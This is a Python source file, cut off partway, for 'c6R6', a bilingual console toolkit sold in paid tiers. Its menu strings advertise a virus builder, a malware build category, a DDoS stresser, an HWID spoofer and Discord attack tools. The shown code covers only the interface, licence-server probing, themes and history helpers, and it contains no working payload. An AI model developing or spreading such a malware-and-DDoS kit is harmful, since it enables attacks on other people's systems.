# -*- coding: utf-8 -*-
# ========================================================================
#   c6R6  v11.0  |  by 31300  |  EN/FR  |  Cython + PyInstaller
# ========================================================================

import os, sys, json, re, time, socket, random, string, hashlib, platform
import subprocess, base64, shutil, threading, urllib.parse, importlib.util
import unicodedata
from datetime import datetime, timezone

# ------------------------------------------------------------------------
# frozen console reattach
# ------------------------------------------------------------------------
_IS_FROZEN = getattr(sys, "frozen", False)
if _IS_FROZEN and os.name == "nt":
    try:
        import ctypes as _ct
        _k = _ct.windll.kernel32
        if _k.GetConsoleWindow() == 0: _k.AllocConsole()
        for _n, _m, _f in (("stdin","r","CONIN$"),("stdout","w","CONOUT$"),("stderr","w","CONOUT$")):
            try:
                if getattr(sys, _n, None) is None:
                    setattr(sys, _n, open(_f, _m, encoding="utf-8", errors="replace"))
            except Exception: pass
        try:
            _h = _k.GetStdHandle(-11); _md = _ct.c_uint32()
            if _k.GetConsoleMode(_h, _ct.byref(_md)):
                _k.SetConsoleMode(_h, _md.value | 0x0004)
        except Exception: pass
    except Exception: pass

if sys.stdin is None:
    import io as _io; sys.stdin = _io.StringIO("")

_ORIG_INPUT = input
def input(p=""):
    try: return _ORIG_INPUT(p)
    except (RuntimeError, EOFError):
        try: sys.stdout.write(p); sys.stdout.flush()
        except Exception: pass
        return ""

if _IS_FROZEN:
    try: os.chdir(os.path.dirname(os.path.abspath(sys.executable)))
    except Exception: pass

if os.name == "nt":
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW("c6R6")
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
    except Exception: pass
if hasattr(sys.stdout, "reconfigure"):
    try: sys.stdout.reconfigure(encoding="utf-8")
    except Exception: pass

def _pip(*pkgs):
    if _IS_FROZEN: return
    for p in pkgs:
        subprocess.run([sys.executable, "-m", "pip", "install", p, "--quiet",
                        "--disable-pip-version-check"], check=False)

try: import requests
except Exception: _pip("requests"); import requests
try:
    from colorama import Fore, init as _ci
    _ci(autoreset=True, strip=False)
except Exception:
    _pip("colorama"); from colorama import Fore, init as _ci; _ci(autoreset=True, strip=False)

R, G, Y, B, M, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
DIM, BRT, RST = "\033[2m", "\033[1m", "\033[0m"
OK, ERR, INF = f"{G}[+]{RST}", f"{R}[x]{RST}", f"{Y}[~]{RST}"
VERSION = "11.0"

_TIER = "free"; _BRAND = ""; _LANG = "en"
_TIER_ORDER = {"free": 0, "vip": 1, "vip+": 2, "ami": 3, "owner": 4}
_SESSION_START = time.time()
def _has_tier(r): return _TIER_ORDER.get(_TIER, 0) >= _TIER_ORDER.get(r, 0)

# ========================================================================
# i18n
# ========================================================================
_T = {
    "back": {"en":"Back","fr":"Retour"},
    "enter": {"en":"[Enter]","fr":"[Entrée]"},
    "copied": {"en":"Copied.","fr":"Copié."},
    "copy_fail": {"en":"Copy failed.","fr":"Échec copie."},
    "copy_ask": {"en":"[c] copy · [Enter] continue","fr":"[c] copier · [Entrée] continuer"},
    "saved": {"en":"Saved","fr":"Sauvegardé"},
    "yes_no": {"en":"(y/n)","fr":"(o/n)"},
    "cancel": {"en":"Cancelled","fr":"Annulé"},
    "invalid": {"en":"Invalid","fr":"Invalide"},
    "not_found": {"en":"Not found","fr":"Introuvable"},
    "hint": {"en":"0=exit  f=fav  h=hist  p=plugins  1337=owner","fr":"0=quitter  f=fav  h=hist  p=plugins  1337=owner"},
    "cat_build": {"en":"MALWARE BUILD","fr":"BUILD MALWARE"},
    "cat_scan":  {"en":"SCAN","fr":"SCAN"},
    "cat_panel": {"en":"PANEL & TOOLS","fr":"PANEL & OUTILS"},
    "cat_net":   {"en":"NETWORK / ATTACK","fr":"RÉSEAU / ATTAQUE"},
    "o_virus":{"en":"Virus Builder","fr":"Constructeur Virus"},
    "o_hwid":{"en":"HWID Spoofer","fr":"Spoofer HWID"},
    "o_disc":{"en":"Discord Tools","fr":"Outils Discord"},
    "o_vc":{"en":"VC Discord","fr":"Outils VC Discord"},
    "o_net":{"en":"Network Scanner","fr":"Scanner Réseau"},
    "o_web":{"en":"Web Tools","fr":"Outils Web"},
    "o_osint":{"en":"OSINT","fr":"OSINT"},
    "o_vip":{"en":"VIP Panel","fr":"Panel VIP"},
    "o_rbx":{"en":"Roblox","fr":"Roblox"},
    "o_crypto":{"en":"Crypto","fr":"Crypto"},
    "o_phone":{"en":"Phone / SMS","fr":"Téléphone / SMS"},
    "o_utils":{"en":"Utilities","fr":"Utilitaires"},
    "o_vipx":{"en":"VIP+ Panel","fr":"Panel VIP+"},
    "o_ami":{"en":"AMI Panel","fr":"Panel AMI"},
    "o_ddos":{"en":"DDoS Stresser","fr":"Stresser DDoS"},
    "o_info":{"en":"Info & Contact","fr":"Info & Contact"},
    "o_set":{"en":"Settings","fr":"Paramètres"},
    "o_compile":{"en":"Compile to EXE (Cython)","fr":"Compiler en EXE (Cython)"},
    "o_plugins":{"en":"Plugins","fr":"Plugins"},
    "lic_title":{"en":"ACTIVATION","fr":"ACTIVATION"},
    "lic_none":{"en":"No valid license.","fr":"Aucune licence valide."},
    "lic_key":{"en":"key","fr":"clé"},
    "lic_ok":{"en":"License activated.","fr":"Licence activée."},
}
def T(k, d=None):
    e = _T.get(k); return (e.get(_LANG) or e.get("en") or k) if e else (d or k)

# ========================================================================
# SETTINGS
# ========================================================================
_SETT_DIR = "1-Output"; _SETT_FILE = os.path.join(_SETT_DIR, ".settings")
_DEFAULT = {
    "auto_activate": True, "preset_key": "", "remember_license": True,
    "clear_cache_on_boot": False, "loader_on": True, "show_tier_badge": True,
    "verbose_server": False, "theme": "blood", "anti_debug": False,
    "auto_update": True, "status_bar": True, "clipboard": True,
    "language": "en", "first_run_done": False, "tamper_check": False,
    "server_url": "",
}
_SETTINGS = dict(_DEFAULT); LOADER_ON = True; _CURRENT_THEME = "blood"

def _load_settings():
    global _SETTINGS, LOADER_ON, _CURRENT_THEME, _LANG
    _SETTINGS = dict(_DEFAULT)
    if os.path.isfile(_SETT_FILE):
        try:
            d = json.load(open(_SETT_FILE, encoding="utf-8"))
            if isinstance(d, dict):
                for k in _DEFAULT:
                    if k in d: _SETTINGS[k] = d[k]
        except Exception: pass
    LOADER_ON = bool(_SETTINGS.get("loader_on", True))
    _CURRENT_THEME = _SETTINGS.get("theme", "blood")
    _LANG = _SETTINGS.get("language", "en") if _SETTINGS.get("language") in ("en","fr") else "en"
    _apply_theme(_CURRENT_THEME)

def _save_settings():
    os.makedirs(_SETT_DIR, exist_ok=True)
    try:
        with open(_SETT_FILE, "w", encoding="utf-8") as f: json.dump(_SETTINGS, f, indent=2)
        return True
    except Exception: return False

def _get(k, d=None): return _SETTINGS.get(k, _DEFAULT.get(k, d))
def _set_lang(l):
    global _LANG
    if l in ("en","fr"): _LANG = l; return True
    return False

# ========================================================================
# THEMES
# ========================================================================
_THEMES = {
    "blood":     {"D":52,"K":88,"B":124,"M":160,"R":196,"L":203,"P":210,"A":220,"AMI":213,"PL":51,"CM":214,"CS":196,"CP":51,"CN":46},
    "matrix":    {"D":22,"K":28,"B":34,"M":40,"R":46,"L":82,"P":118,"A":154,"AMI":46,"PL":82,"CM":118,"CS":46,"CP":82,"CN":40},
    "cyberpunk": {"D":53,"K":90,"B":127,"M":165,"R":201,"L":207,"P":213,"A":226,"AMI":201,"PL":51,"CM":201,"CS":51,"CP":207,"CN":201},
    "mono":      {"D":236,"K":240,"B":244,"M":248,"R":255,"L":252,"P":250,"A":255,"AMI":253,"PL":255,"CM":250,"CS":252,"CP":255,"CN":248},
}
_CURRENT_THEME = "blood"
DEEP=DARK=BASE=MID=BRIGHT=LIGHT=PALE=ACCENT=AMI_COL=PLUS_COL=CAT_BUILD=CAT_SCAN=CAT_PANEL=CAT_NET=GHOST=""
def _apply_theme(name):
    global _CURRENT_THEME, DEEP,DARK,BASE,MID,BRIGHT,LIGHT,PALE,ACCENT,AMI_COL,PLUS_COL,CAT_BUILD,CAT_SCAN,CAT_PANEL,CAT_NET,GHOST
    t = _THEMES.get(name, _THEMES["blood"]); _CURRENT_THEME = name
    f = lambda n: f"\033[38;5;{n}m"
    DEEP, DARK, BASE, MID = f(t["D"]), f(t["K"]), f(t["B"]), f(t["M"])
    BRIGHT, LIGHT, PALE = f(t["R"]), f(t["L"]), f(t["P"])
    ACCENT, AMI_COL, PLUS_COL = f(t["A"]), f(t["AMI"]), f(t["PL"])
    CAT_BUILD, CAT_SCAN, CAT_PANEL, CAT_NET = f(t["CM"]), f(t["CS"]), f(t["CP"]), f(t["CN"])
    GHOST = f(238)
_apply_theme("blood")

# ========================================================================
# TEXT / ANSI
# ========================================================================
_ANSI_RE = re.compile(r"\033\[[0-9;?]*[a-zA-Z]")
def _cw(c):
    return 2 if unicodedata.east_asian_width(c) in ("W","F") else 1
def _vlen(s):
    w = 0
    for c in _ANSI_RE.sub("", s): w += _cw(c)
    return w
def _pad(s, w):
    return s + " " * max(0, w - _vlen(s))
def _trunc(s, w):
    if _vlen(s) <= w: return s
    out_, vis, i = "", 0, 0
    while i < len(s):
        m = _ANSI_RE.match(s, i)
        if m: out_ += m.group(0); i = m.end(); continue
        cw = _cw(s[i])
        if vis + cw > max(0, w - 1): break
        out_ += s[i]; vis += cw; i += 1
    return out_ + "…"
def _term_w():
    try: return shutil.get_terminal_size((120, 40)).columns
    except Exception: return 120

# ========================================================================
# HELPERS
# ========================================================================
def clr(): os.system("cls" if platform.system() == "Windows" else "clear")
def pause(): input(f"\n{DIM}  {T('enter')}{RST} ")
def ask(p, d=""):
    v = input(f"  {W}{p}{RST} ").strip(); return v if v else d
def ask_int(p, d=0):
    try: return int(ask(p, str(d)))
    except Exception: return d
def jget(url, headers=None, timeout=6):
    try: return requests.get(url, headers=headers, timeout=timeout).json()
    except Exception as e: return {"error": str(e)}
def out(name, content):
    os.makedirs("1-Output", exist_ok=True)
    p = os.path.join("1-Output", name)
    with open(p, "w", encoding="utf-8") as f: f.write(content)
    print(f"\n{OK} {T('saved')} → {Y}{p}{RST}")
def pkv(d, indent=0):
    pad = "   " * indent
    if isinstance(d, dict):
        for k, v in d.items():
            if isinstance(v, dict): print(f"{pad}{C}{k}{RST}:"); pkv(v, indent + 1)
            elif isinstance(v, list): print(f"{pad}{C}{k}{RST}: {W}{v[:5]}{RST}" + (f" {DIM}…{len(v)}{RST}" if len(v) > 5 else ""))
            else: print(f"{pad}{Y}{str(k):<22}{RST} {W}{v}{RST}")
    else: print(f"{pad}{W}{d}{RST}")
def _slug(s): return re.sub(r"[^a-z0-9_-]+", "_", s.lower()).strip("_")[:40] or "x"
def _is_win(): return platform.system() == "Windows"

# ========================================================================
# LOADER
# ========================================================================
_FRAMES = ["▖", "▘", "▝", "▗"]
def _page_loader(text):
    if not LOADER_ON: return
    tw = _term_w(); label = _trunc(text, 26)
    for i in range(19):
        p = i / 18; filled = int(26 * p)
        bar = "█" * filled + "░" * (26 - filled)
        line = (f"  {MID}{_FRAMES[i % 4]}{RST} {PALE}{label:<26}{RST} "
                f"{BRIGHT}[{bar}]{RST} {GHOST}{int(p*100):>3}%{RST}")
        sys.stdout.write("\r" + _trunc(line, tw - 2)); sys.stdout.flush()
        time.sleep(0.32 / 18)
    sys.stdout.write("\r" + " " * (tw - 1) + "\r"); sys.stdout.flush()
def _loader_steps(title, steps):
    if not LOADER_ON: return
    for s in steps: _page_loader(f"{title} :: {s}")

# ========================================================================
# ANIMATED INTRO
# ========================================================================
_GLITCH_CHARS = "█▓▒░▄▀■□▪▫◆◇○●◉▸◂▴▾"
_SCAN_CHARS   = "─━┄╌·"

def _glitch_line(line, intensity=0.35):
    """Remplace aléatoirement quelques caractères par des glitchs."""
    out = []
    for ch in line:
        if ch != ' ' and random.random() < intensity:
            out.append(random.choice(_GLITCH_CHARS))
        else:
            out.append(ch)
    return "".join(out)

def _intro_clear_line(tw):
    sys.stdout.write("\r" + " " * (tw - 1) + "\r"); sys.stdout.flush()

def _intro_print_logo(W_, glitch=False, alpha=1.0):
    """Affiche le logo avec effet glitch optionnel et opacité simulée."""
    for i, line in enumerate(LOGO):
        pad = " " * max(0, (W_ - LOGO_W) // 2)
        if glitch:
            intensity = random.uniform(0.1, 0.5)
            displayed = _glitch_line(line, intensity)
        else:
            displayed = line
        if i < 4:
            col = BRIGHT
        else:
            col = DARK
        print(pad + BRT + col + displayed + RST)

def _intro_scan_line(W_, row_count, color):
    """Affiche une ligne de scan horizontale animée."""
    total = W_ - 4
    bar = ""
    for i in range(total):
        bar += random.choice(_SCAN_CHARS)
    sys.stdout.write(f"  {color}{bar}{RST}\n"); sys.stdout.flush()

def _intro_typewriter(text, color, delay=0.028, center=True, W_=None):
    """Affiche du texte caractère par caractère."""
    if W_ is None: W_ = _term_w()
    if center:
        pad = " " * max(0, (W_ - len(text)) // 2)
    else:
        pad = "  "
    sys.stdout.write(pad)
    for ch in text:
        sys.stdout.write(color + ch + RST)
        sys.stdout.flush()
        time.sleep(delay + random.uniform(0, 0.012))
    sys.stdout.write("\n"); sys.stdout.flush()

def _intro_blink_line(text, color, blinks=3, W_=None):
    if W_ is None: W_ = _term_w()
    pad = " " * max(0, (W_ - _vlen(text)) // 2)
    for _ in range(blinks):
        sys.stdout.write(f"\r{pad}{color}{text}{RST}"); sys.stdout.flush()
        time.sleep(0.12)
        sys.stdout.write(f"\r{pad}" + " " * _vlen(text)); sys.stdout.flush()
        time.sleep(0.08)
    sys.stdout.write(f"\r{pad}{color}{text}{RST}\n"); sys.stdout.flush()

def _intro_progress(label, color, steps=30, total_time=0.9):
    """Barre de progression stylisée pour l'intro."""
    tw = _term_w()
    delay = total_time / steps
    for i in range(steps + 1):
        p = i / steps
        filled = int(24 * p)
        bar = "█" * filled + "░" * (24 - filled)
        pct = f"{int(p * 100):>3}%"
        spin = _GLITCH_CHARS[i % len(_GLITCH_CHARS)]
        line = f"  {color}{spin}{RST} {PALE}{label:<20}{RST} {color}[{bar}]{RST} {GHOST}{pct}{RST}"
        sys.stdout.write("\r" + _trunc(line, tw - 2)); sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\r" + " " * (tw - 1) + "\r"); sys.stdout.flush()

def play_intro():
    """Séquence d'introduction animée complète."""
    if not LOADER_ON: return
    W_ = _term_w()

    # --- PHASE 1 : glitch storm (logo corrompu 6x) ---
    clr()
    for frame in range(6):
        clr()
        intensity = 0.6 - frame * 0.08          # diminue progressivement
        for line in LOGO:
            pad = " " * max(0, (W_ - LOGO_W) // 2)
            col = BRIGHT if LOGO.index(line) < 4 else DARK
            print(pad + BRT + col + _glitch_line(line, intensity) + RST)
        time.sleep(0.07)

    # --- PHASE 2 : scan lines qui descendent ---
    clr()
    scan_col = BRIGHT
    for row in range(len(LOGO) + 4):
        clr()
        # logo propre au-dessus du scan
        for i, line in enumerate(LOGO):
            pad = " " * max(0, (W_ - LOGO_W) // 2)
            if i <= row:
                col = BRIGHT if i < 4 else DARK
                print(pad + BRT + col + line + RST)
            else:
                col = DARK
                print(pad + col + _glitch_line(line, 0.25) + RST)
        time.sleep(0.055)

    # --- PHASE 3 : logo stable + subtitle typewriter ---
    clr()
    for i, line in enumerate(LOGO):
        pad = " " * max(0, (W_ - LOGO_W) // 2)
        col = BRIGHT if i < 4 else DARK
        print(pad + BRT + col + line + RST)
    print()

    _intro_typewriter(SUBTITLE, BRT + LIGHT, delay=0.032, W_=W_)
    time.sleep(0.15)

    # tagline blink
    _intro_blink_line(TAGLINE, GHOST, blinks=3, W_=W_)
    time.sleep(0.1)

    # version + discord
    ver_line = f"v{VERSION}  ·  {DISCORD_LINK}"
    _intro_typewriter(ver_line, DIM, delay=0.018, W_=W_)
    time.sleep(0.2)

    # --- PHASE 4 : boot checklist typewriter ---
    print()
    boot_items = [
        (f"[SYS]  kernel interface     {G}OK{RST}", PALE),
        (f"[NET]  tunnel probe         {G}OK{RST}", PALE),
        (f"[SEC]  anti-debug           {G}ARMED{RST}", PALE),
        (f"[LIC]  tier verified        {G}{_TIER.upper()}{RST}", PALE),
        (f"[ENC]  session cipher       {G}AES-256{RST}", PALE),
        (f"[PLG]  plugin engine        {G}READY{RST}", PALE),
    ]
    for text, color in boot_items:
        _intro_typewriter(text, color, delay=0.010, center=False, W_=W_)
        time.sleep(0.04)

    print()

    # --- PHASE 5 : barre de chargement finale ---
    _intro_progress("INITIALIZING", BRIGHT, steps=35, total_time=0.75)

    # --- PHASE 6 : flash final ---
    for _ in range(2):
        clr()
        time.sleep(0.04)
        clr()
        for i, line in enumerate(LOGO):
            pad = " " * max(0, (W_ - LOGO_W) // 2)
            col = BRIGHT if i < 4 else DARK
            print(pad + BRT + col + line + RST)
        time.sleep(0.06)

    time.sleep(0.18)

# ========================================================================
# BANNERS
# ========================================================================
LOGO = [
    r"   ▄▄▄█▄▄▄  ▄█▀▀█▄  ▄█▀▀█▄  ▄█▀▀█▄  ▄█▀▀█▄",
    r"  ▐▓█▓▀▓█▓▌▐▓█  ▓█▌▐▓█  ▓█▌▐▓█  ▓█▌▐▓█  ▓█▌",
    r"  ▐▓█  ▐▓█▌▐▓█▄▄▓█▌▐▓█▄▄▓█▌▐▓█▄▄▓█▌▐▓█  ▓█▌",
    r"  ▐▓█  ▐▓█▌▐▓█▀▀▓█▌▐▓█▀▀▓█▌▐▓█▀▀▓█▌▐▓█  ▓█▌",
    r"  ▐▓█  ▐▓█▌▐▓█  ▓█▌▐▓█  ▓█▌▐▓█  ▓█▌▐▓█▄▄▓█▌",
    r"  ░▒█  ░▒█▌░▒█  ▒█▌░▒█  ▒█▌░▒█  ▒█▌░▒█▒▒▒█▌",
]
LOGO_W = max(_vlen(l) for l in LOGO)
SUBTITLE = "made by 31300  ·  c6R6Cyxxk"
TAGLINE = "──[ c 6 R 6 ]──"
DISCORD_LINK = "https://discord.gg/c6R6Cyxxk"

def leakfr_banner():
    clr(); W_ = _term_w()
    for l in LOGO[:4]: print(" " * max(0, (W_ - LOGO_W) // 2) + BRT + BRIGHT + l + RST)
    for l in LOGO[4:]: print(" " * max(0, (W_ - LOGO_W) // 2) + DARK + l + RST)
    print()
    print(" " * max(0, (W_ - len(SUBTITLE)) // 2) + BRT + LIGHT + SUBTITLE + RST)
    badge = {"owner": f" {ACCENT}◆ OWNER{RST}", "ami": f" {AMI_COL}◆ AMI{RST}",
             "vip+": f" {PLUS_COL}◆ VIP+{RST}", "vip": f" {BRIGHT}◆ VIP{RST}"}.get(_TIER, f" {GHOST}· free{RST}")
    if _BRAND and _TIER in ("ami","owner"): badge += f"  {AMI_COL}[{_BRAND}]{RST}"
    print(" " * max(0, (W_ - _vlen(badge)) // 2) + badge)
    print(" " * max(0, (W_ - len(TAGLINE)) // 2) + GHOST + TAGLINE + RST)
    print()

def banner_s(title):
    _page_loader(title); leakfr_banner()
    bar = "═" * min(60, _term_w() - 4)
    print(f"  {MID}{bar}{RST}")
    print(f"  {MID}║{RST} {BRT}{LIGHT}{_pad(title, 58)}{RST} {MID}║{RST}")
    print(f"  {MID}{bar}{RST}\n")

def menu_box(title, opts, color=None):
    _page_loader(title); leakfr_banner()
    cm = color or MID; ca = color or BRIGHT
    title = _trunc(title, 52)
    fill = max(0, 58 - _vlen(title) - 3)
    print(f"  {cm}┌─[ {BRT}{ca}{title}{RST}{cm} ]{'─' * fill}┐{RST}")
    for n, t in opts:
        arrow = f"{ca}▸{RST}" if n != "0" else f"{DARK}◂{RST}"
        item = f" {arrow} {PALE}[{n}]{RST} {W}{t}{RST}"
        vis = 2 + len(n) + 2 + _vlen(t)
        print(f"  {cm}│{RST}{item}" + " " * max(0, 58 - vis) + f"{cm}│{RST}")
    print(f"  {cm}└{'─' * 58}┘{RST}\n")

# ========================================================================
# SERVER HEALTH
# ========================================================================
_LIC_SERVER_DEFAULT = "https://c6r6-licence.loca.lt"

def _srv_url():
    u = (_get("server_url") or "").strip()
    return u if u else _LIC_SERVER_DEFAULT

_SRV_HEADERS = {
    "Bypass-Tunnel-Reminder": "true",
    "bypass-tunnel-reminder": "true",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
}
_SESSION = requests.Session()
_SESSION.headers.update(_SRV_HEADERS)
_SESSION.mount("https://", requests.adapters.HTTPAdapter(max_retries=0))
_SESSION.mount("http://",  requests.adapters.HTTPAdapter(max_retries=0))

_PING = {"ms": None, "state": "unknown", "detail": "", "ts": 0, "ttl": 0}

def _state_rank(s):
    return {"online":10, "auth":6, "tunnel":5, "404":4,
            "badgateway":3, "unavailable":3, "error":2,
            "timeout":1, "dns":1, "refused":1, "ssl":1, "offline":0}.get(s, 0)

def _probe_once(path, timeout=8, verify=True, base=None):
    url = (base or _srv_url()) + path
    try:
        t0 = time.perf_counter()
        r = _SESSION.get(url, timeout=timeout, allow_redirects=True, verify=verify)
        return {"ms": int((time.perf_counter() - t0) * 1000),
                "status": r.status_code,
                "ctype": r.headers.get("Content-Type", "").lower(),
                "server": r.headers.get("Server", ""),
                "body": (r.text or "")[:3000],
                "final_url": r.url,
                "error": None}
    except requests.exceptions.SSLError as e:
        return {"error": "ssl", "detail": str(e)[:100]}
    except requests.exceptions.Timeout:
        return {"error": "timeout", "detail": f"{timeout}s"}
    except requests.exceptions.ConnectionError as e:
        m = str(e)[:140]
        if "getaddrinfo" in m or "Name or service" in m or "nodename nor servname" in m:
            return {"error": "dns", "detail": m}
        if "refused" in m.lower():
            return {"error": "refused", "detail": m}
        return {"error": "offline", "detail": m}
    except Exception as e:
        return {"error": "error", "detail": str(e)[:100]}

def _classify(p):
    if p.get("error"): return p["error"], p.get("detail", "")
    status, ctype, body_l = p["status"], p["ctype"], p["body"].lower()
    if status == 511: return "tunnel", "511-interstitial"
    if status == 200 and "text/html" in ctype:
        if any(k in body_l for k in ("localtunnel","tunnel reminder","friendly reminder",
                                      "click the button","continue to")):
            return "tunnel", "html-interstitial"
    if "json" in ctype and 200 <= status < 300: return "online", "200-json"
    if 200 <= status < 300: return "online", str(status)
    if status in (401,403): return "auth", f"http{status}"
    if status == 404: return "404", "route-missing"
    if status == 502: return "badgateway", "502-bad-gateway"
    if status == 503: return "unavailable", "503-down"
    return "error", f"http{status}"

def _http_variant(url):
    if url.startswith("https://"): return "http://" + url[8:]
    if url.startswith("http://"):  return "https://" + url[7:]
    return "http://" + url

def _probe_chain():
    base = _srv_url(); http_base = _http_variant(base)
    return [
        ("/version", True,  base), ("/health", True,  base), ("/", True,  base),
        ("/version", False, base), ("/health", False, base), ("/", False, base),
        ("/version", True,  http_base), ("/health", True,  http_base),
    ]

def _ping_srv(force=False):
    now = time.time()
    if not force and _PING["ts"] and (now - _PING["ts"]) < _PING["ttl"]:
        return _PING["ms"], _PING["state"], _PING["detail"]

    best = ("offline", "", None)
    for path, verify, base in _probe_chain():
        p = _probe_once(path, timeout=8, verify=verify, base=base)
        state, detail = _classify(p)
        if state == "online":
            _PING.update(ms=p.get("ms"), state="online", detail=f"{path} {detail}",
                         ts=now, ttl=60)
            return p.get("ms"), "online", _PING["detail"]
        if _state_rank(state) > _state_rank(best[0]):
            best = (state, f"{path} {detail}", p.get("ms"))
        if p.get("error") in ("dns","refused","offline","timeout","ssl"):
            break
    _PING.update(ms=best[2], state=best[0], detail=best[1], ts=now, ttl=10)
    return best[2], best[0], best[1]

def _status_line():
    if not _get("status_bar", True): return None
    tc = {"free": DIM, "vip": BRIGHT, "vip+": PLUS_COL, "ami": AMI_COL, "owner": ACCENT}.get(_TIER, DIM)
    s = int(time.time() - _SESSION_START); m, se = divmod(s, 60); h, m = divmod(m, 60)
    up = f"{h}h{m:02d}m" if h else (f"{m}m{se:02d}s" if m else f"{se}s")
    try:
        so = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); so.connect(("8.8.8.8", 80))
        lip = so.getsockname()[0]; so.close()
    except Exception: lip = "?.?.?.?"
    ms, state, _ = _ping_srv()
    ps = {
        "online": (G if (ms or 9999) < 150 else Y if (ms or 9999) < 400 else R, f"● {ms}ms"),
        "tunnel": (Y, "● tunnel 511"),
        "auth": (Y, "● auth-wall"),
        "404": (R, "● route-404"),
        "badgateway": (R, "● 502"),
        "unavailable": (R, "● 503"),
        "timeout": (R, "● timeout"),
        "dns": (R, "● dns-fail"),
        "refused": (R, "● refused"),
        "ssl": (R, "● ssl"),
    }.get(state, (R, "● offline"))
    return (f"{tc}{_TIER}{RST} {GHOST}·{RST} {LIGHT}v{VERSION}{RST} {GHOST}·{RST} "
            f"{PALE}{up}{RST} {GHOST}·{RST} {W}{lip}{RST} {GHOST}·{RST} {ps[0]}{ps[1]}{RST}")

def _draw_status():
    line = _status_line()
    if line is None: return
    pad = max(0, (_term_w() - _vlen(line) - 4) // 2)
    print(f"\n{' ' * pad}{DARK}──[ {RST}{line}{DARK} ]──{RST}")

def _srv_diagnostic():
    banner_s("SERVER DIAGNOSTIC")
    url = _srv_url()
    print(f"  {Y}URL{RST}    : {W}{url}{RST}")
    print(f"  {Y}HWID{RST}   : {W}{_hwid()}{RST}")
    print(f"  {Y}Headers{RST}: {DIM}Bypass-Tunnel-Reminder: true{RST}\n")
    print(f"  {MID}──[ probe ladder ]──{RST}\n")
    best = ("offline", "")
    for path, verify, base in _probe_chain():
        p = _probe_once(path, timeout=8, verify=verify, base=base)
        state, detail = _classify(p)
        col = G if state == "online" else Y if state in ("tunnel","auth") else R
        b = base or url
        v = "" if verify else f" {DIM}(verify=off){RST}"
        print(f"  {PALE}{b}{path}{RST}{v}")
        print(f"    {col}[{state:<11}]{RST} {DIM}{detail}{RST}")
        if p.get("error"):
            print(f"    {R}err{RST}: {p.get('detail','')[:140]}")
        else:
            print(f"    {W}status{RST}={p['status']}  {W}ms{RST}={p['ms']}  "
                  f"{W}ctype{RST}={p['ctype'][:40] or '-'}")
            if p.get("body"):
                print(f"    {DIM}body: {p['body'][:200].replace(chr(10),' ')}{RST}")
        print()
        if _state_rank(state) > _state_rank(best[0]): best = (state, detail)
        if p.get("error") in ("dns","refused","offline"):
            print(f"  {Y}→{RST} Network-level failure, aborting ladder.\n"); break
    print(f"  {MID}──[ verdict ]──{RST}\n")
    col = G if best[0] == "online" else Y if best[0] in ("tunnel","auth") else R
    print(f"  {col}{best[0]}{RST}  {DIM}{best[1]}{RST}\n")
    hints = {
        "online":      "Server reachable. If license fails, key/HWID mismatch.",
        "tunnel":      f"loca.lt interstitial blocked. Open {url} in browser once,\n"
                       f"     click Continue, then retry.",
        "auth":        "Server requires auth — check X-Admin header / endpoint path.",
        "404":         "Route missing. Your server must expose /version returning JSON.",
        "badgateway":  "502 — tunnel alive, upstream Python dead. Restart the server.",
        "unavailable": "503 — tunnel is up but not routed. Check `lt --port N` is running.",
        "timeout":     "Timeout — loca.lt cold start. Wait 30s and retry.",
        "dns":         "DNS failure. Check network / VPN / hosts file.",
        "refused":     "Connection refused. Port/service down.",
        "ssl":         "TLS error. Try http:// instead — Settings > 21.",
    }
    print(f"  {Y}→{RST} {hints.get(best[0], 'Unknown state.')}\n")
    print(f"  {DIM}Tip: Settings > 21 to change the server URL.{RST}")
    _hist_log("SRV","Diag",f"{best[0]} {best[1][:40]}"); pause()

# ========================================================================
# CLIPBOARD / HISTORY / FAVORITES
# ========================================================================
def _clip(text):
    if not _get("clipboard", True): return False
    try:
        if os.name == "nt":
            subprocess.run("clip", input=text.encode("utf-8"), check=True, shell=True)
        elif platform.system() == "Darwin":
            subprocess.run("pbcopy", input=text.encode("utf-8"), check=True)
        else:
            subprocess.run(["xclip","-selection","clipboard"], input=text.encode("utf-8"), check=True)
        return True
    except Exception: return False
def clip_pause(text=""):
    if _get("clipboard", True) and text:
        c = input(f"\n{DIM}  {T('copy_ask')}{RST} ").strip().lower()
        if c == "c":
            print(f"  {OK} {T('copied')}" if _clip(text) else f"  {ERR} {T('copy_fail')}")
    else: pause()

_HIST_FILE = os.path.join(_SETT_DIR, ".history")
_FAV_FILE = os.path.join(_SETT_DIR, ".favorites")
def _hist_log(module, action, summary=""):
    os.makedirs(_SETT_DIR, exist_ok=True)
    try:
        with open(_HIST_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps({"ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                                "m": module, "a": action, "s": str(summary)[:120]}) + "\n")
        lines = open(_HIST_FILE, encoding="utf-8").readlines()
        if len(lines) > 200:
            open(_HIST_FILE, "w", encoding="utf-8").writelines(lines[-200:])
    except Exception: pass
def _hist_load(n=30):
    if not os.path.isfile(_HIST_FILE): return []
    try:
        out_ = []
        for l in open(_HIST_FILE, encoding="utf-8").readlines()[-n:]:
            try: out_.append(json.loads(l.strip()))
            except Exception: pass
        return out_
    except Exception: return []
def _fav_load():
    if not os.path.isfile(_FAV_FILE): return []
    try: return [l.strip() for l in open(_FAV_FILE, encoding="utf-8") if l.strip()]
    except Exception: return []
def _fav_save(items):
    os.makedirs(_SETT_DIR, exist_ok=True)
    try: open(_FAV_FILE, "w", encoding="utf-8").write("\n".join(items)); return True
    except Exception: return False

def history_screen():
    banner_s("HISTORY"); rows = _hist_load(30)
    if not rows: print(f"  {DIM}Empty.{RST}"); pause(); return
    for r in rows:
        print(f"  {DIM}{r.get('ts','?')}{RST} {Y}{r.get('m','?'):<10}{RST} "
              f"{W}{r.get('a','?'):<20}{RST} {PALE}{r.get('s','')}{RST}")
    pause()
def favorites_screen():
    banner_s("FAVORITES"); items = _fav_load()
    if not items: print(f"  {DIM}None.{RST}"); pause(); return
